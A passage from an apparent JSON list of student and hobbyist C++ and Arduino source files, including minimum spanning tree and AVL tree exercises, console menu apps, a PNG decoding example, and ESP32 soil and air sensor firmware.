std::chrono::high_resolution_clock::now();\n    result = MST::kruskalWithUnionFind(graph);\n    end = std::chrono::high_resolution_clock::now();\n    duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);\n    std::cout << \"\u4f18\u5316\u7684Kruskal\u7b97\u6cd5\u6267\u884c\u65f6\u95f4: \" << duration.count() << \" \u5fae\u79d2\" << std::endl;\n}\n\nint main() {\n    // \u8bbe\u7f6e\u63a7\u5236\u53f0\u7f16\u7801\u4e3a UTF-8\uff0c\u652f\u6301\u4e2d\u6587\u663e\u793a\n    SetConsoleOutputCP(65001);\n    SetConsoleCP(65001);\n\n    int choice;\n    Graph* graph = nullptr;\n\n    // \u4e3b\u83dc\u5355\u5faa\u73af\n    while (true) {\n        std::cout << \"\\n\u57ce\u5e02\u4ea4\u901a\u7f51\u7edc\u6700\u5c0f\u751f\u6210\u6811\u7cfb\u7edf\\n\";\n        std::cout << \"1. \u4ece\u952e\u76d8\u8f93\u5165\u6570\u636e\\n\";\n        std::cout << \"2. \u4ece\u6587\u4ef6\u8f93\u5165\u6570\u636e\\n\";\n        std::cout << \"3. \u663e\u793a\u5f53\u524d\u7f51\u7edc\\n\";\n        std::cout << \"4. \u4f7f\u7528Prim\u7b97\u6cd5\u751f\u6210\u6700\u5c0f\u751f\u6210\u6811\\n\";\n        std::cout << \"5. \u4f7f\u7528\u4f18\u5316\u7684Prim\u7b97\u6cd5\u751f\u6210\u6700\u5c0f\u751f\u6210\u6811\\n\";\n        std::cout << \"6. \u4f7f\u7528Kruskal\u7b97\u6cd5\u751f\u6210\u6700\u5c0f\u751f\u6210\u6811\\n\";\n        std::cout << \"7. \u4f7f\u7528\u4f18\u5316\u7684Kruskal\u7b97\u6cd5\u751f\u6210\u6700\u5c0f\u751f\u6210\u6811\\n\";\n        std::cout << \"8. \u8fd0\u884c\u6027\u80fd\u6d4b\u8bd5\\n\";\n        std::cout << \"0. \u9000\u51fa\\n\";\n        std::cout << \"\u8bf7\u9009\u62e9: \";\n        std::cin >> choice;\n\n        switch (choice) {\n            case 1: {\n                delete graph;\n                graph = new Graph(0);\n                graph->loadFromKeyboard();\n                break;\n            }\n            case 2: {\n                std::string filename;\n                std::cout << \"\u8bf7\u8f93\u5165\u6587\u4ef6\u540d: \";\n                std::cin >> filename;\n                delete graph;\n                graph = new Graph(0);\n                graph->loadFromFile(filename);\n                break;\n            }\n            case 3: {\n                if (graph) graph->displayGraph();\n                else std::cout << \"\u8bf7\u5148\u8f93\u5165\u7f51\u7edc\u6570\u636e\uff01\\n\";\n                break;\n            }\n            case 4: {\n                if (graph) {\n                    auto result = MST::prim(*graph);\n                    std::cout << \"\\nPrim\u7b97\u6cd5\u7ed3\u679c\uff1a\\n\";\n                    printMSTResult(result, *graph);\n                } else std::cout << \"\u8bf7\u5148\u8f93\u5165\u7f51\u7edc\u6570\u636e\uff01\\n\";\n                break;\n            }\n            case 5: {\n                if (graph) {\n                    auto result = MST::primWithPQ(*graph);\n                    std::cout << \"\\n\u4f18\u5316\u7684Prim\u7b97\u6cd5\u7ed3\u679c\uff1a\\n\";\n                    printMSTResult(result, *graph);\n                } else std::cout << \"\u8bf7\u5148\u8f93\u5165\u7f51\u7edc\u6570\u636e\uff01\\n\";\n                break;\n            }\n            case 6: {\n                if (graph) {\n                    auto result = MST::kruskal(*graph);\n                    std::cout << \"\\nKruskal\u7b97\u6cd5\u7ed3\u679c\uff1a\\n\";\n                    printMSTResult(result, *graph);\n                } else std::cout << \"\u8bf7\u5148\u8f93\u5165\u7f51\u7edc\u6570\u636e\uff01\\n\";\n                break;\n            }\n            case 7: {\n                if (graph) {\n                    auto result = MST::kruskalWithUnionFind(*graph);\n                    std::cout << \"\\n\u4f18\u5316\u7684Kruskal\u7b97\u6cd5\u7ed3\u679c\uff1a\\n\";\n                    printMSTResult(result, *graph);\n                } else std::cout << \"\u8bf7\u5148\u8f93\u5165\u7f51\u7edc\u6570\u636e\uff01\\n\";\n                break;\n            }\n            case 8: {\n                if (graph) {\n                    runPerformanceTest(*graph);\n                } else std::cout << \"\u8bf7\u5148\u8f93\u5165\u7f51\u7edc\u6570\u636e\uff01\\n\";\n                break;\n            }\n            case 0: {\n                delete graph;\n                return 0;\n            }\n            default: {\n                std::cout << \"\u65e0\u6548\u7684\u9009\u62e9\uff01\\n\";\n            }\n        }\n    }\n\n    return 0;\n} ",
    "#include\"Soild7in1.h\"\n#include \"Arduino.h\"\nuint8_t rx = 16;\nuint8_t tx = 17;\nSoftwareSerial mySerial(rx, tx);\nSoild7in1 ::Soild7in1(uint32_t baud_rate, int rxPIN, int txPIN) {\n  this->_baud_rate = baud_rate;\n  rx = rxPIN;\n  tx = txPIN;\n}\nint Soild7in1::getSensorValue(byte dataForSend[8], uint8_t sizeOfData,\n                              uint8_t possion) {\n  mySerial.begin(this->_baud_rate);\n  delay(200);\n  mySerial.write(dataForSend, 8);\n  delay(200);\n  if (mySerial.available()) {\n    mySerial.readBytes(receiveData, sizeOfData - 1);\n    return receiveData[possion] << 8 | receiveData[possion + 1];\n  } else {\n    return 0;\n  }\n}\nint Soild7in1 ::getHumidity() {\n  return getSensorValue(_queryTemHum, 10, 3);\n}\nint Soild7in1 ::getTemperature() {\n  return getSensorValue(_queryTemHum, 10, 5);\n}\nint Soild7in1 ::getPH() {\n  return getSensorValue(_queryPH, 8, 3);\n}\nint Soild7in1 ::getNito() {\n  return getSensorValue(_queryN, 8, 3);\n}\nint Soild7in1 ::getPhotpho() {\n  return getSensorValue(_queryP, 8, 3);\n}\nint Soild7in1 ::getKali() {\n  return getSensorValue(_queryK, 8, 3);\n}\nint Soild7in1 ::getEC() {\n  return getSensorValue(_queryEC, 8, 3);\n}\n",
    "#include <iostream>\r\n#include <cmath>\r\nusing namespace std;\r\n\r\n// Function to represent the equation f(x) = e^(-x) - x\r\ndouble func(double x) {\r\n    return exp(-x) - x;\r\n}\r\n\r\n// Derivative of the function f'(x) = -e^(-x) - 1\r\ndouble derivative(double x) {\r\n    return -exp(-x) - 1;\r\n}\r\n\r\n// Function to implement Newton's Method\r\nvoid newton(double initial_guess, int max_iterations, double tolerance) {\r\n    double x = initial_guess;\r\n    int iteration = 0;\r\n\r\n    while (iteration < max_iterations) {\r\n        // Compute the function value and its derivative at the current point\r\n        double fx = func(x);\r\n        double fx_prime = derivative(x);\r\n\r\n        // Check if the derivative is zero (to avoid division by zero)\r\n        if (fx_prime == 0) {\r\n            cout << \"Derivative is zero, no solution found.\" << endl;\r\n            return;\r\n        }\r\n\r\n        // Update the guess using Newton's method\r\n        double new_x = x - fx / fx_prime;\r\n\r\n        // Check if the change is smaller than the tolerance\r\n        if (fabs(new_x - x) < tolerance) {\r\n            cout << \"Converged to the root: \" << new_x << endl;\r\n            cout << \"Functional value at the root: \" << func(new_x) << endl;\r\n            cout << \"Number of iterations: \" << iteration + 1 << endl;\r\n            return;\r\n        }\r\n\r\n     \r\n        x = new_x;\r\n        iteration++;\r\n    }\r\n\r\n    // If maximum iterations are reached, output the last result\r\n    cout << \"Maximum iterations reached. Approximate root: \" << x << endl;\r\n    cout << \"Functional value at the approximate root: \" << func(x) << endl;\r\n    cout << \"Number of iterations: \" << max_iterations << endl;\r\n}\r\n\r\nint main() {\r\n    double initial_guess;\r\n    int max_iterations;\r\n    double tolerance;\r\n\r\n    // Read the initial guess, maximum iterations, and tolerance from the user\r\n    cout << \"Enter an initial guess for the root: \";\r\n    cin >> initial_guess;\r\n\r\n    cout << \"Enter the maximum number of iterations: \";\r\n    cin >> max_iterations;\r\n\r\n    cout << \"Enter the desired tolerance: \";\r\n    cin >> tolerance;\r\n\r\n    // Call the Newton's Method to solve the equation\r\n    newton(initial_guess, max_iterations, tolerance);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include<iostream>\n#include<string>\n#include\"\u83dc\u5355.h\"\n#include\"\u961f\u5217.h\"\n#include\"\u663e\u793a\u4fe1\u606f.h\"\nusing namespace std;\n\nint main() {\n\tint switch_on = 0;\n\tstring name_;\n\tdouble id_;\n\t\n\tLinkQueue Q;\n\tInitQueue(Q);\n\t\n\twhile (true)\n\t{\n\tint flag = 1;\n\tstring key;\n\t\tmean();\n\t\tcout << \"\u8bf7\u8f93\u5165\u4f60\u9700\u8981\u7684\u6570\u5b57\" << endl;\n\t\tcin >> switch_on;\n\n\t\tswitch (switch_on)\n\t\t{\n\t\tcase 1:\n\n\t\t\twhile (flag) {\n\t\t\t\tcout << \"\u8bf7\u8f93\u5165\u4f60\u7684\u540d\u5b57\" << endl;\n\t\t\t\tcin >> name_;\n\t\t\t\tcout << \"\u8bf7\u8f93\u5165\u4f60\u7684\u75c5\u5386\u53f7\" << endl;\n\t\t\t\tcin >> id_;\n\n\t\t\t\tEnQueue(Q, name_, id_);//\u6392\u961f--\u8f93\u4eba\u6392\u961f\u75c5\u4eba\u7684\u75c5\u5386\u53f7\uff0c\u52a0\u5165\u5230\u75c5\u4eba\u6392\u961f\u961f\u5217\u4e2d\n\t\t\t\tpatient_show(Q.rear);\n\n\t\t\t\tstd::cout << \"\u5df2\u52a0\u5165\u5230\u75c5\u4eba\u6392\u961f\u961f\u5217\u4e2d\" << std::endl;\n\n\n\t\t\t\tcout << \"\u5b8c\u6210\u4e86\u5417\uff1f\u8f93\u5165\uff1a\u662f\uff1f\u5426\" << endl;\n\t\t\t\tcin >> key;\n\t\t\t\tif (!key.compare(\"\u662f\"))\n\t\t\t\t\t\n\t\t\t\t{\n\n\t\t\t\t\tflag = 0;\n\t\t\t\t}\n\t\t\t\n\t\t\t}\n\t\t\t\tsystem(\"pause\");\n\t\t\tsystem(\"cls\");\n\t\t\tbreak;\n\t\tcase 2:       //2\uff1a\u5c31\u8bca--\u75c5\u4eba\u6392\u961f\u961f\u5217\u4e2d\u6700\u524d\u9762\u7684\u75c5\u4eba\u5c31\u8bca\uff0c\u5e76\u5c06\u5176\u4ece\u961f\u5217\u4e2d\u5220\u9664\n\t\t\tdeletefront_QNode(Q);\n\t\t\tstd::cout << \"\u5df2\u5c31\u533b\u5b8c\u6210\u4e86\" << std::endl;\n\t\t\tsystem(\"pause\");\n\t\t\tsystem(\"cls\");\n\t\t\tbreak;\n\t\tcase 3:    //3\uff1a\u67e5\u770b\u6392\u961f--\u4ece\u961f\u9996\u5230\u961f\u5c3e\u5217\u51fa\u6240\u6709\u7684\u6392\u961f\u75c5\u4eba\u7684\u75c5\u5386\u53f7\u3002\n\t\t\ttraversal(Q);\n\t\t\tsystem(\"pause\");\n\t\t\tsystem(\"cls\");\n\t\t\tbreak;\n\t\tcase 4://\t4\uff1a\u4e0d\u518d\u6392\u961f\uff0c\u4f59\u4e0b\u4f9d\u6b21\u5c31\u8bca--\u4ece\u961f\u9996\u5230\u961f\u5c3e\u5217\u51fa\u6240\u6709\u7684\u6392\u961f\u75c5\u4eba\u7684\u75c5\u5386\u53f7\uff0c\u5e76\u9000\u51fa\u8fd0\u884c\n\t\t\ttraversal(Q);\n\t\t\tDestoryQueue(Q);\n\n\t\t\tsystem(\"pause\");\n\t\t\treturn 0;\n\t\t\tbreak;\n\t\tcase 5:           //\n\t\t\tsystem(\"pause\");\n\t\t\treturn 0;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsystem(\"cls\");\n\t\t\tbreak;\n\t\t}\n\t\t\n\t}\n\n\n\n\n\tsystem(\"pause\");\n\treturn 0;\n}",
    "/*\nLodePNG Examples\n\nCopyright (c) 2005-2012 Lode Vandevenne\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any damages\narising from the use of this software.\n\nPermission is granted to anyone to use this software for any purpose,\nincluding commercial applications, and to alter it and redistribute it\nfreely, subject to the following restrictions:\n\n    1. The origin of this software must not be misrepresented; you must not\n    claim that you wrote the original software. If you use this software\n    in a product, an acknowledgment in the product documentation would be\n    appreciated but is not required.\n\n    2. Altered source versions must be plainly marked as such, and must not be\n    misrepresented as being the original software.\n\n    3. This notice may not be removed or altered from any source\n    distribution.\n*/\n\n#include \"lodepng.h\"\n#include <iostream>\n\n/*\n3 ways to decode a PNG from a file to RGBA pixel data (and 2 in-memory ways).\n*/\n\n//g++ lodepng.cpp example_decode.cpp -ansi -pedantic -Wall -Wextra -O3\n\n\n//Example 1\n//Decode from disk to raw pixels with a single function call\nvoid decodeOneStep(const char* filename) {\n  std::vector<unsigned char> image; //the raw pixels\n  unsigned width, height;\n\n  //decode\n  unsigned error = lodepng::decode(image, width, height, filename);\n\n  //if there's an error, display it\n  if(error) std::cout << \"decoder error \" << error << \": \" << lodepng_error_text(error) << std::endl;\n\n  //the pixels are now in the vector \"image\", 4 bytes per pixel, ordered RGBARGBA..., use it as texture, draw it, ...\n}\n\n//Example 2\n//Load PNG file from disk to memory first, then decode to raw pixels in memory.\nvoid decodeTwoSteps(const char* filename) {\n  std::vector<unsigned char> png;\n  std::vector<unsigned char> image; //the raw pixels\n  unsigned width, height;\n\n  //load and decode\n  unsigned error = lodepng::load_file(png, filename);\n  if(!error) error = lodepng::decode(image, width, height, png);\n\n  //if there's an error, display it\n  if(error) std::cout << \"decoder error \" << error << \": \" << lodepng_error_text(error) << std::endl;\n\n  //the pixels are now in the vector \"image\", 4 bytes per pixel, ordered RGBARGBA..., use it as texture, draw it, ...\n}\n\n//Example 3\n//Load PNG file from disk using a State, normally needed for more advanced usage.\nvoid decodeWithState(const char* filename) {\n  std::vector<unsigned char> png;\n  std::vector<unsigned char> image; //the raw pixels\n  unsigned width, height;\n  lodepng::State state; //optionally customize this one\n\n  unsigned error = lodepng::load_file(png, filename); //load the image file with given filename\n  if(!error) error = lodepng::decode(image, width, height, state, png);\n\n  //if there's an error, display it\n  if(error) std::cout << \"decoder error \" << error << \": \"<< lodepng_error_text(error) << std::endl;\n\n  //the pixels are now in the vector \"image\", 4 bytes per pixel, ordered RGBARGBA..., use it as texture, draw it, ...\n  //State state contains extra information about the PNG such as text chunks, ...\n}\n\nint main(int argc, char *argv[]) {\n  const char* filename = argc > 1 ? argv[1] : \"test.png\";\n\n  decodeOneStep(filename);\n}\n\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nclass BookManagement{\r\npublic:\r\n    vector<vector<string>> book;\r\n    vector<string> single_book;\r\n\r\n    void InsertBook(string book_name, string author_name, int book_id, int price){\r\n        string book_id2 = to_string(book_id);\r\n        string price2 = to_string(price);\r\n        single_book.push_back(book_name);\r\n        single_book.push_back(author_name);\r\n        single_book.push_back(book_id2);\r\n        single_book.push_back(price2);\r\n        book.push_back(single_book);\r\n        cout << \"Book added Successfully\" << endl << endl;\r\n    }\r\n\r\n    void display(){\r\n        if(book.empty()){\r\n            cout << \"No books to display\" << endl << endl;\r\n            return;\r\n        }\r\n        for(int i = 0; i<book.size(); i++){\r\n            cout << \"Book Name: \" << book[i][0] << endl;\r\n            cout << \"Author Name: \" << book[i][1] << endl;\r\n            cout << \"Book ID: \" << book[i][2] << endl;\r\n            cout << \"Book price: \"<< book[i][3] << endl;\r\n            cout << \"-----------------------------------\" << endl << endl;\r\n        }\r\n    }\r\n\r\n    void deleteBook(int id){\r\n        for(int i = 0;i<book.size();i++){\r\n            if(book[i][2] == to_string(id)){\r\n                book.erase(book.begin()+i);\r\n                cout << \"book deleted successfully\" << endl << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Book not found\" << endl;\r\n    }\r\n    void checkAvailability(int id){\r\n        for(int i = 0;i<book.size();i++){\r\n            if(book[i][2] == to_string(id)){\r\n                cout << \"Book is available\" << endl << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Book is not available\" << endl << endl;\r\n    }\r\n    void SearchBook(int id){\r\n        for(int i = 0;i<book.size(); i++){\r\n            if(book[i][2] == to_string(id)){\r\n                cout<<\"Book Name: \" << book[i][0] << endl;\r\n                cout<<\"Author Name: \"<<book[i][1] << endl;\r\n                cout<<\"Book ID: \"<<book[i][2] << endl;\r\n                cout<<\"Book price: \"<<book[i][3] << endl;\r\n                cout<<\"-----------------------------------\" << endl << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Book not found\" << endl << endl;\r\n    }\r\n    void UpdateBookinfo(string book_name, string author_name, int book_id, int price){\r\n        for(int i = 0;i<book.size();i++){\r\n            if(book[i][2] == to_string(book_id)){\r\n                book[i][0] = book_name;\r\n                book[i][1] = author_name; \r\n                book[i][3] = to_string(price);\r\n                cout<<\"Book updated successfully\" << endl << endl;  \r\n                return;\r\n            }\r\n        }\r\n        cout <<\"Book not found\" << endl << endl;\r\n    }\r\n};\r\n\r\nint main(){\r\n    BookManagement manager;\r\n    while(true){\r\n        cout << \"Welcome to the Books Management System\" <<endl;\r\n        cout << \"1. Add a book\" << endl;\r\n        cout << \"2. Display all books\" << endl;\r\n        cout << \"3. Delete a book\" << endl;\r\n        cout << \"4. Check availability\" << endl;\r\n        cout << \"5. Search for a book\" << endl;\r\n        cout << \"6. Update book informataion\" << endl;\r\n        int choice;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n        switch(choice){\r\n            case 1:{\r\n                cin.ignore();\r\n                string book_name, author_name;\r\n                int Book_id, price;\r\n                cout << \"Enter the book name: \";\r\n                getline(cin, book_name);\r\n                cout << \"Enter the author name: \";\r\n                getline(cin, author_name);\r\n                cout << \"Enter the book id: \";\r\n                cin >> Book_id;\r\n                cout << \"Enter the price: \";\r\n                cin >> price;\r\n                manager.InsertBook(book_name, author_name, Book_id, price);\r\n                break;\r\n            }\r\n            case 2: {\r\n                cout << \"Displaying all books\" << endl;\r\n                manager.display();\r\n                break;\r\n            }\r\n            case 3: {\r\n                int id;\r\n                cout << \"Enter ID of the book you want to delete: \";\r\n                cin >> id;\r\n                manager.deleteBook(id);\r\n                break;\r\n            }\r\n            case 4: {\r\n                int id;\r\n                cout << \"Enter the ID of the book you want to check availablity: \";\r\n                cin >> id;\r\n                manager.checkAvailability(id);\r\n                break;\r\n            }\r\n            case 5: {\r\n                int id;\r\n                cout << \"Enter the ID of the book you want to search: \";\r\n                cin >> id;\r\n                manager.SearchBook(id);\r\n                break;\r\n            }\r\n            case 6: {\r\n                int id;\r\n                cout << \"Enter the id of the book you want to update: \";\r\n                cin >> id;\r\n                cin.ignore();\r\n     ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_criar_pdf\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#ifndef __PROGTEST__\n#include <cassert>\n#include <cstdarg>\n#include <iomanip>\n#include <cstdint>\n#include <iostream>\n#include <memory>\n#include <limits>\n#include <optional>\n#include <array>\n#include <random>\n#include <type_traits>\n\n// We use std::set as a reference to check our implementation.\n// It is not available in progtest :)\n#include <set>\n\ntemplate < typename T >\nstruct Ref {\n    size_t size() const { return _data.size(); }\n    const T* find(const T& value) const {\n        auto it = _data.find(value);\n        if (it == _data.end()) return nullptr;\n        return &*it;\n    }\n    bool insert(const T& value) { return _data.insert(value).second; }\n    bool erase(const T& value) { return _data.erase(value); }\n\n    auto begin() const { return _data.begin(); }\n    auto end() const { return _data.end(); }\n\nprivate:\n    std::set<T> _data;\n};\n\n#endif\n\n\nnamespace config {\n    // Enable to check that the tree is AVL balanced.\n    inline constexpr bool CHECK_DEPTH = false;\n\n    // Disable if your implementation does not have parent pointers\n    inline constexpr bool PARENT_POINTERS = true;\n}\n\ntemplate <typename T>\nstruct Node{\n\n    T value;\n    Node<T>* left = nullptr;\n    Node<T>* right = nullptr;\n    Node<T>* parent = nullptr;\n    int m_depth = 0;\n\n    Node() = default;\n\n    Node<T>* BVSInsert(Node<T>*& node, const T& key) {\n        if (node == nullptr) {\n            node = new Node<T>();\n            node->value = key;\n            node->m_depth = 1;\n            return node;\n        }\n\n        if (key < node->value) {\n            node->left = BVSInsert(node->left, key);\n            node->left->parent = node;\n        } else if (key > node->value) {\n            node->right = BVSInsert(node->right, key);\n            node->right->parent = node;\n        } else {\n            // Key already exists, do not insert\n            return node;\n        }\n\n        // Update depth\n        int left_depth = node->left ? node->left->m_depth : 0;\n        int right_depth = node->right ? node->right->m_depth : 0;\n        node->m_depth = std::max(left_depth, right_depth) + 1;\n\n        // Calculate balance factor\n        int balance = right_depth - left_depth;\n\n        // Balancing\n        if (balance == 2) {\n            int right_balance = (node->right->right ? node->right->right->m_depth : 0) - (node->right->left ? node->right->left->m_depth : 0);\n            if (right_balance > 0) {\n                RotateLeft(&node);\n            } else {\n                RotateRight(&(node->right));\n                RotateLeft(&node);\n            }\n        } else if (balance ==-2 ) {\n            int left_balance = (node->left->right ? node->left->right->m_depth : 0) - (node->left->left ? node->left->left->m_depth : 0);\n            if (left_balance < 0) {\n                RotateRight(&node);\n            } else {\n                RotateLeft(&(node->left));\n                RotateRight(&node);\n            }\n        }\n\n        return node;\n    }\n\n\n    void RotateLeft(Node<T>** node) {\n        Node<T>* x = *node;\n        Node<T>* y = x->right;\n\n        x->right = y->left;\n        if (x->right != nullptr) {\n            x->right->parent = x;\n        }\n\n        y->left = x;\n        y->parent = x->parent;\n\n        if (x->parent != nullptr) {\n            if (x->parent->left == x) {\n                x->parent->left = y;\n            } else {\n                x->parent->right = y;\n            }\n        }\n\n        x->parent = y;\n        *node = y;\n\n        // Update depths\n        x->m_depth = std::max(\n                x->left ? x->left->m_depth : 0,\n                x->right ? x->right->m_depth : 0\n        ) + 1;\n\n        y->m_depth = std::max(\n                y->left ? y->left->m_depth : 0,\n                y->right ? y->right->m_depth : 0\n        ) + 1;\n    }\n\n\n\n    void RotateRight(Node<T>** node) {\n        Node<T>* x = *node;\n        Node<T>* y = x->left;\n\n        x->left = y->right;\n        if (x->left != nullptr) {\n            x->left->parent = x;\n        }\n\n        y->right = x;\n        y->parent = x->parent;\n\n        if (x->parent != nullptr) {\n            if (x->parent->left == x) {\n                x->parent->left = y;\n            } else {\n                x->parent->right = y;\n            }\n        }\n\n        x->parent = y;\n        *node = y;\n\n        // Update depths\n        x->m_depth = std::max(\n                x->left ? x->left->m_depth : 0,\n                x->right ? x->right->m_depth : 0\n        ) + 1;\n\n        y->m_depth = std::max(\n                y->left ? y->left->m_depth : 0,\n                x->m_depth\n        ) + 1;\n    }\n\n\n    void BVSShow(const Node<T>* node, std::ostream& os) {\n        if (node == nullptr) {\n            return;\n        }\n        BVSShow(node->left, os);\n        os << \" \" << node->value;\n        BVSShow(node->right, os);\n    }\n\n    Node<T>* BVSMin(Node<T>* node) {\n        if (node == nullptr) {\n            return nullptr;\n        }\n        if (node->left == nullptr) {\n            return node;\n        }\n        return BVSMin(node->le",
    "// TODO: Change LED behavior\n#include <BH1750.h>\n#include <Adafruit_NeoPixel.h>\n#include <Arduino.h>\n#include <SensirionI2CScd4x.h>\n#include \"Adafruit_SHT4x.h\"\n#include <WiFi.h>\n#include <PubSubClient.h>\n#include <ArduinoJson.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <time.h>\n\n#include <secret.h>\n\n#define PIN 7\n#define NUMPIXELS 2\n#define SDA 5\n#define SCL 6\n\nchar mqttTopic[50];\n\nWiFiClient espClient;\nPubSubClient mqttClient(espClient);\n\nAdafruit_NeoPixel strip = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB + NEO_KHZ800);\nAdafruit_SHT4x sht4 = Adafruit_SHT4x();\nSensirionI2CScd4x scd4x;\n// TODO: Light sensor is not visible in I2C\n\nvoid SetupTime()\n{\n  configTime(gmtOffset_sec, daylightOffset_sec, \"pool.ntp.org\");\n  setenv(\"TZ\", Timezone, 1);\n  tzset();\n  delay(100);\n}\n\nint getCurrentHour()\n{\n  time_t now = time(NULL);\n  if (now == -1)\n    return -1;\n  struct tm *currentTime = localtime(&now);\n  return currentTime->tm_hour;\n}\n\nvoid setColor(uint8_t r, uint8_t g, uint8_t b)\n{\n  int hour = getCurrentHour();\n\n  if (!enableLedsInNight && hour != -1 && (hour > sleepHour || hour < wakeupHour))\n  {\n    for (int i = 0; i < NUMPIXELS; i++)\n    {\n      strip.setPixelColor(i, strip.Color(r / 255, g / 255, b / 255));\n    }\n    strip.show();\n    return;\n  }\n\n  for (int i = 0; i < NUMPIXELS; i++)\n  {\n    strip.setPixelColor(i, strip.Color(r, g, b));\n  }\n  strip.show();\n}\n\nvoid fadeSingleColor(uint8_t r, uint8_t g, uint8_t b, uint8_t maxBrightness)\n{\n  if (maxBrightness < 0)\n  {\n    return;\n  }\n  if (maxBrightness > 255)\n  {\n    maxBrightness = 255;\n  }\n  for (int brightness = 0; brightness <= maxBrightness; brightness += 10)\n  {\n    setColor((r * brightness) / 255, (g * brightness) / 255, (b * brightness) / 255);\n    delay(100);\n  }\n\n  for (int brightness = maxBrightness; brightness >= 0; brightness -= 10)\n  {\n    setColor((r * brightness) / 255, (g * brightness) / 255, (b * brightness) / 255);\n    delay(100);\n  }\n}\n\nvoid connectToWiFi()\n{\n  if (WiFi.status() == WL_CONNECTED)\n  {\n    return;\n  }\n  WiFi.mode(WIFI_STA);\n  WiFi.setTxPower(WIFI_POWER_5dBm);\n  WiFi.begin(ssid, password);\n  Serial.print(\"Connecting to WiFi ..\");\n  int counter = 0;\n  while (WiFi.status() != WL_CONNECTED)\n  {\n    fadeSingleColor(0, 0, 255, 100);\n    delay(500);\n    Serial.print(\".\");\n    counter++;\n    if (counter > 30)\n    {\n      Serial.println(\"Failed to connect to WiFi\");\n      ESP.restart();\n    }\n  }\n  Serial.println(\"\\nConnected to the WiFi network\");\n  Serial.print(\"IP Address: \");\n  Serial.println(WiFi.localIP());\n  Serial.print(\"RSSI: \");\n  Serial.print(WiFi.RSSI());\n  Serial.println(\" dBm\");\n}\n\nint mqttTries = 0;\nvoid connectToMQTTBroker()\n{\n  connectToWiFi();\n  mqttTries = 0;\n  while (!mqttClient.connected())\n  {\n    Serial.print(\"RSSI: \");\n    Serial.print(WiFi.RSSI());\n    Serial.println(\" dBm\");\n    Serial.print(\"Connecting to MQTT...\");\n    mqttClient.setServer(mqttServer, mqttPort);\n    if (mqttClient.connect(sensorId, mqttUser, mqttPassword))\n    {\n      Serial.println(\"connected\");\n    }\n    else\n    {\n      Serial.print(\" failed with state \");\n      Serial.println(mqttClient.state());\n      delay(2000);\n    }\n    mqttTries++;\n    if (mqttTries > 30)\n    {\n      ESP.restart();\n    }\n  }\n}\n\nvoid setup()\n{\n  Serial.begin(115200);\n  strip.begin();\n\n  connectToWiFi();\n  SetupTime();\n\n  Wire.begin(SDA, SCL);\n\n  if (!sht4.begin())\n  {\n    Serial.println(\"Couldn't find SHT4x\");\n    while (1)\n      delay(1);\n  }\n  sht4.setPrecision(SHT4X_HIGH_PRECISION);\n  sht4.setHeater(SHT4X_NO_HEATER);\n\n  scd4x.begin(Wire);\n  uint16_t error;\n  char errorMessage[256];\n\n  error = scd4x.stopPeriodicMeasurement();\n  if (error)\n  {\n    Serial.print(\"Error trying to execute stopPeriodicMeasurement(): \");\n    errorToString(error, errorMessage, 256);\n    Serial.println(errorMessage);\n  }\n\n  error = scd4x.startPeriodicMeasurement();\n  if (error)\n  {\n    Serial.print(\"Error trying to execute startPeriodicMeasurement(): \");\n    errorToString(error, errorMessage, 256);\n    Serial.println(errorMessage);\n  }\n  strncpy(mqttTopic, mqttTopicBase, sizeof(mqttTopic) - 1);\n  strncat(mqttTopic, sensorId, sizeof(mqttTopic) - 1);\n}\n\nsensors_event_t hum, temp;\nuint32_t timestamp = 0;\nuint16_t co2 = 0;\nfloat co2Temperature = 0.0f;\nfloat co2Humidity = 0.0f;\nuint16_t error = 0;\nchar errorMessage[256];\nbool isDataReady = false;\n\nStaticJsonDocument<256> jsonDoc;\n\nvoid loop()\n{\n  hum.relative_humidity = 0.0f;\n  temp.temperature = 0.0f;\n  timestamp = 0;\n  co2 = 0;\n  co2Temperature = 0.0f;\n  co2Humidity = 0.0f;\n  error = 0;\n  isDataReady = false;\n\n  error = scd4x.getDataReadyFlag(isDataReady);\n  if (error)\n  {\n    Serial.print(\"Error trying to execute getDataReadyFlag(): \");\n    errorToString(error, errorMessage, 256);\n    Serial.println(errorMessage);\n    Serial.println();\n    delay(1000);\n    return;\n  }\n  if (!isDataReady)\n  {\n    Serial.println(\"Data not ready yet\");\n    fadeSingleColor(255, 100, 0, 100);\n    delay(1000);\n    return;\n  }\n\n  error = scd4x.readMeasurement(co2, ",
